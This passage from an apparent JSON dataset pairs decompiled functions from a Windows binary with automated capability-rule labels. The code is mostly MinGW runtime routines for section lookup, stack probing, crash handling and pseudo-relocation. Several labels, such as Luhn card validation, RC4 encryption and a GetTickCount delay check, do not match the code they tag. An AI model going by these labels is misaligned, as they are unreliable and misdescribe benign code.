        "decompiled_code": "\nint64_t fcn.6bac2930(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    arg1 = arg1 + *(arg1 + 0x3c);\n    if (*(arg1 + 6) != 0) {\n        iVar2 = arg1 + 0x18 + *(arg1 + 0x14);\n        iVar1 = iVar2 + 0x28;\n        do {\n            if ((*(iVar2 + 0xc) <= arg2) && (arg2 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 0x28;\n        } while (iVar2 != iVar1 + (*(arg1 + 6) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "6bac2980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2980(ulong arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    uVar3 = sub.msvcrt.dll_strlen();\n    if (uVar3 < 9) {\n        iVar2 = fcn.6bac2900(0x6bac0000);\n        if (iVar2 != 0) {\n            iVar4 = *0x6bac003c;\n            uVar1 = *(iVar4 + 0x6bac0006);\n            if (uVar1 != 0) {\n                iVar5 = iVar4 + 0x6bac0018 + *(iVar4 + 0x6bac0014);\n                iVar4 = iVar5 + 0x28;\n                while( true ) {\n                    iVar2 = sub.msvcrt.dll_strncmp(iVar5, arg1, 8);\n                    if (iVar2 == 0) break;\n                    iVar5 = iVar5 + 0x28;\n                    if (iVar5 == iVar4 + (uVar1 - 1) * 0x28) {\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 288
    },
    "6bac2a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2a20(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar2 = fcn.6bac2900(0x6bac0000);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = *0x6bac003c;\n    if (*(iVar3 + 0x6bac0006) != 0) {\n        iVar4 = iVar3 + 0x6bac0018 + *(iVar3 + 0x6bac0014);\n        iVar1 = iVar4 + 0x28;\n        do {\n            if ((*(iVar4 + 0xc) <= arg1 - 0x6bac0000U) && (arg1 - 0x6bac0000U < *(iVar4 + 0xc) + *(iVar4 + 8))) {\n                return iVar4;\n            }\n            iVar4 = iVar4 + 0x28;\n        } while (iVar4 != iVar1 + (*(iVar3 + 0x6bac0006) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "6bac2a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.6bac2a60(void)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    \n    iVar1 = fcn.6bac2900(0x6bac0000);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = *(*0x6bac003c + 0x6bac0006);\n    }\n    return uVar2;\n}\n",
        "token_count": 94
    },
    "6bac2a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2a90(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar2 = fcn.6bac2900(0x6bac0000);\n    if (iVar2 != 0) {\n        iVar3 = *0x6bac003c;\n        if (*(iVar3 + 0x6bac0006) != 0) {\n            iVar4 = iVar3 + 0x6bac0018 + *(iVar3 + 0x6bac0014);\n            iVar1 = iVar4 + 0x28;\n            do {\n                if ((*(iVar4 + 0x27) & 0x20) != 0) {\n                    if (arg1 == 0) {\n                        return iVar4;\n                    }\n                    arg1 = arg1 + -1;\n                }\n                iVar4 = iVar4 + 0x28;\n            } while (iVar4 != iVar1 + (*(iVar3 + 0x6bac0006) - 1) * 0x28);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 256
    },
    "6bac2b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.6bac2b10(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.6bac2900(0x6bac0000);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = 0x6bac0000;\n    }\n    return uVar2;\n}\n",
        "token_count": 86
    },
    "6bac2b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2b90(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = 0;\n    iVar2 = fcn.6bac2900(0x6bac0000);\n    if ((((iVar2 != 0) && (uVar1 = *(*0x6bac003c + 0x6bac0090),  uVar1 != 0)) &&\n        (iVar3 = fcn.6bac2930(0x6bac0000, uVar1),  iVar3 != 0)) && (iVar3 = uVar1 + 0x6bac0000,  iVar4 = 0,  iVar3 != 0)\n       ) {\n        while( true ) {\n            if ((*(iVar3 + 4) == 0) && (*(iVar3 + 0xc) == 0)) {\n                return 0;\n            }\n            if (arg1 < 1) break;\n            arg1._0_4_ = arg1 + -1;\n            iVar3 = iVar3 + 0x14;\n        }\n        iVar4 = *(iVar3 + 0xc) + 0x6bac0000;\n    }\n    return iVar4;\n}\n",
        "token_count": 289
    },
    "6bac2d00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.6bac2d00(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 183
    },
    "6bac2110": {
        "rules": [
            "contain loop",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.6bac2110(ulong param_1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    ulong var_8h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    \n    (*_sym.imp.KERNEL32.dll_RtlCaptureContext)(0x6bac7060);\n    uVar2 = *0x6bac7158;\n    iVar1 = (*_sym.imp.KERNEL32.dll_RtlLookupFunctionEntry)(*0x6bac7158, &var_28h, 0);\n    if (iVar1 == 0) goto code_r0x6bac21f0;\n    (*_sym.imp.KERNEL32.dll_RtlVirtualUnwind)(0, var_28h, uVar2, iVar1, 0x6bac7060, &var_18h, &var_20h, 0);\n    do {\n        *0x6bac7540 = 0xc0000409;\n        *0x6bac7544 = 1;\n        *0x6bac7550 = *0x6bac7158;\n        *0x6bac70e0 = param_1;\n        (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n        (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x6bac3430);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2, 0xc0000409);\n        sub.msvcrt.dll_abort();\ncode_r0x6bac21f0:\n        *0x6bac7158 = var_8h;\n        *0x6bac70f8 = *0x20;\n    } while( true );\n}\n",
        "token_count": 407
    },
    "6bac19b0": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x6bac1bdf: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x6bac1be4)\n// WARNING: Removing unreachable block (ram,0x6bac1bf1)\n// WARNING: Removing unreachable block (ram,0x6bac1bfa)\n// WARNING: Removing unreachable block (ram,0x6bac1ced)\n// WARNING: Removing unreachable block (ram,0x6bac1cf7)\n// WARNING: Removing unreachable block (ram,0x6bac1d01)\n// WARNING: Removing unreachable block (ram,0x6bac1dc8)\n// WARNING: Removing unreachable block (ram,0x6bac1dd4)\n// WARNING: Removing unreachable block (ram,0x6bac1de0)\n// WARNING: Removing unreachable block (ram,0x6bac1dec)\n// WARNING: Removing unreachable block (ram,0x6bac1df9)\n// WARNING: Removing unreachable block (ram,0x6bac1e05)\n// WARNING: Removing unreachable block (ram,0x6bac1e12)\n// WARNING: Removing unreachable block (ram,0x6bac1e23)\n// WARNING: Removing unreachable block (ram,0x6bac1e96)\n// WARNING: Removing unreachable block (ram,0x6bac1ea3)\n// WARNING: Removing unreachable block (ram,0x6bac1e3e)\n// WARNING: Removing unreachable block (ram,0x6bac1e40)\n// WARNING: Removing unreachable block (ram,0x6bac1f19)\n// WARNING: Removing unreachable block (ram,0x6bac1f23)\n// WARNING: Removing unreachable block (ram,0x6bac1e49)\n// WARNING: Removing unreachable block (ram,0x6bac1e61)\n// WARNING: Removing unreachable block (ram,0x6bac1eec)\n// WARNING: Removing unreachable block (ram,0x6bac1ec5)\n// WARNING: Removing unreachable block (ram,0x6bac1ed4)\n// WARNING: Removing unreachable block (ram,0x6bac1f36)\n// WARNING: Removing unreachable block (ram,0x6bac1f3b)\n// WARNING: Removing unreachable block (ram,0x6bac1f44)\n// WARNING: Removing unreachable block (ram,0x6bac1ed6)\n// WARNING: Removing unreachable block (ram,0x6bac1edb)\n// WARNING: Removing unreachable block (ram,0x6bac1eb4)\n// WARNING: Removing unreachable block (ram,0x6bac1ef8)\n// WARNING: Removing unreachable block (ram,0x6bac1f05)\n// WARNING: Removing unreachable block (ram,0x6bac1e6a)\n// WARNING: Removing unreachable block (ram,0x6bac1e6f)\n// WARNING: Removing unreachable block (ram,0x6bac1e79)\n// WARNING: Removing unreachable block (ram,0x6bac1e88)\n// WARNING: Removing unreachable block (ram,0x6bac1e91)\n// WARNING: Removing unreachable block (ram,0x6bac1d11)\n// WARNING: Removing unreachable block (ram,0x6bac1d1a)\n// WARNING: Removing unreachable block (ram,0x6bac1d21)\n// WARNING: Removing unreachable block (ram,0x6bac1d46)\n// WARNING: Removing unreachable block (ram,0x6bac1d54)\n// WARNING: Removing unreachable block (ram,0x6bac1d83)\n// WARNING: Removing unreachable block (ram,0x6bac1d93)\n// WARNING: Removing unreachable block (ram,0x6bac1f49)\n// WARNING: Removing unreachable block (ram,0x6bac1f67)\n// WARNING: Removing unreachable block (ram,0x6bac1f93)\n// WARNING: Removing unreachable block (ram,0x6bac1fb0)\n// WARNING: Removing unreachable block (ram,0x6bac1dad)\n// WARNING: Removing unreachable block (ram,0x6bac1d70)\n\nvoid fcn.6bac19b0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    char *arg1_00;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint *puVar6;\n    code *pcVar7;\n    ulong *puVar8;\n    ulong arg3_00;\n    uchar *arg4_00;\n    int64_t unaff_R12;\n    int64_t unaff_R13;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uchar auStack376 [64];\n    uint64_t uStack312;\n    ulong *puStack304;\n    ulong uStack296;\n    int64_t iStack288;\n    code *pcStack280;\n    ulong auStack240 [3];\n    ulong uStack216;\n    int32_t iStack204;\n    ulong auStack192 [4];\n    int32_t iStack156;\n    uchar auStack132 [12];\n    ulong uStack120;\n    ulong *puStack112;\n    \n    puStack112 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar2 = sub.msvcrt.dll___iob_func();\n    arg4_00 = iVar2 + 0x60;\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    iVar2 = sub.msvcrt.dll___iob_func();\n    uStack312 = iVar2 + 0x60;\n    uStack296 = arg1;\n    puStack304 = puStack112;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    if (puStack304 == NULL) {\n        return;\n    }\n    puVar8 = puStack304;\n    uStack120 = arg1;\n    if (*0x6bac7040 < 1) {\n        pcVar5 = NULL;\n    }\n    else {\n        pcVar5 = NULL;\n        puVar3 = *0x6bac7038;\n        do {\n            if ((*(puVar3 + 8) <= uStack312) &&\n               (puVar8 = *(*(puVar3 + 0x10) + 8),  pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery, \n               uStack312 < *(puVar3 + 8) + puVar8)) goto code_r0x6bac1b17;\n            uVar4 = pcVar5 + 1;\n            pcVar5 = uVar4;\n            puVar3 = puVar3 + 0x18;\n        } while (uVar4 != *0x6bac7040);\n    }\n    pcStack280 = 0x6bac1aa0;\n    unaff_R12 = fcn.6bac2a20(uStack312);\n    if (unaff_R12 == 0) {\n        pcStack280 = 0x6bac1c3d;\n        fcn.6bac19b0(\"Address %p has no image-section\", uStack312, puVar8, arg4_00);\n    }\n    else {\n        unaff_R13 = pcVar5 * 0x18;\n        puVar6 = *0x6bac7038 + unaff_R13;\n        *(puVar6 + 4) = unaff_R12;\n        *puVar6 = 0;\n        pcStack280 = 0x6bac1ad2;\n        iVar2 = fcn.6bac2b10();\n        *(puVar6 + 2) = iVar2 + *(unaff_R12 + 0xc);\n        pcVar5 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        pcStack280 = 0x6bac1afe;\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(*0x6bac7038 + unaff_R13 + 8), auStack192, 0x30);\n        if (iVar2 != 0) {\n            if ((iStack156 == 4) || (iStack156 == 0x40)) {\ncode_r0x6bac1b10:\n                *0x6bac7040 = *0x6bac7040 + 1;\n                pcVar7 = pcVar5;\n            }\n            else {\n                arg3_00 = 0x40;\n                arg4_00 = *0x6bac7038 + unaff_R13;\n                pcStack280 = 0x6bac1b85;\n                iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack192[0]);\n                if (iVar1 != 0) goto code_r0x6bac1b10;\n                pcStack280 = 0x6bac1b8f;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcStack280 = 0x6bac1b9d;\n                fcn.6bac19b0(\"  VirtualProtect failed with code 0x%x\", uVar4, arg3_00, arg4_00);\n                pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            }\ncode_r0x6bac1b17:\n            pcStack280 = 0x6bac1b27;\n            iVar2 = (*pcVar7)(uStack312, auStack240, 0x30);\n            pcVar5 = pcVar7;\n            if (iVar2 != 0) {\n                if ((iStack204 != 4) && (iStack204 != 0x40)) {\n                    pcStack280 = 0x6bac1bd6;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack240[0], uStack216, 0x40, auStack132);\n                    pcStack280 = 0x6bac1be4;\n                }\n    // WARNING: Could not recover jumptable at 0x6bac2db8. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_memcpy)(uStack312, uStack296, puStack304);\n                return;\n            }\n            goto code_r0x6bac1c5a;\n        }\n    }\n    pcStack280 = 0x6bac1c5a;\n    fcn.6bac19b0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), *(*0x6bac7038 + unaff_R13 + 8), \n                 arg4_00);\ncode_r0x6bac1c5a:\n    arg1_00 = \"  VirtualQuery failed for %d bytes at address %p\";\n    pcStack280 = 0x6bac1c6e;\n    fcn.6bac19b0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, uStack312, arg4_00);\n    if (*0x6bac7030 == 0) {\n        *0x6bac7030 = 1;\n        iStack288 = unaff_R12;\n        pcStack280 = pcVar5;\n        fcn.6bac2a60();\n        iVar2 = fcn.6bac2d00(arg1_00);\n        *0x6bac7040 = 0;\n        *0x6bac7038 = auStack376 + -iVar2;\n    }\n    return;\n}\n",
        "token_count": 2534
    }
}